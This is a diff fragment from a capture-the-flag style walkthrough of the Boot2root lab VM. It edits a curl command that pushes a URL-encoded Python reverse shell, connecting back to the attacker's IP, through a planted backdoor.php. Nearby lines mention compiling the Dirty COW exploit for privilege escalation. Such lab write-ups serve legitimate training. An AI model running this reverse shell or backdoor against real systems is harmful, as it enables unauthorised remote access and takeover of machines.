@@ -12,7 +12,7 @@ When logged in as user www-data we can go to /tmp to write our exploit and compi
 
  2. Secondly, we send our reverse shell through our backdoor:
  
- `curl --insecure https://<BOOT2ROOT IP>/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<OUR IP>%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27
+ `curl --insecure https://<BOOT2ROOT IP>/forum/templates_c/backdoor.php\?cmd\=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<OUR IP>%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27
 `
 
  3. Now we are connected to the VM of Boot2root on www-data and we can write on ou current directory /var/www/forum/templates_c so let's copy our dirty.c, compile it and then execute it
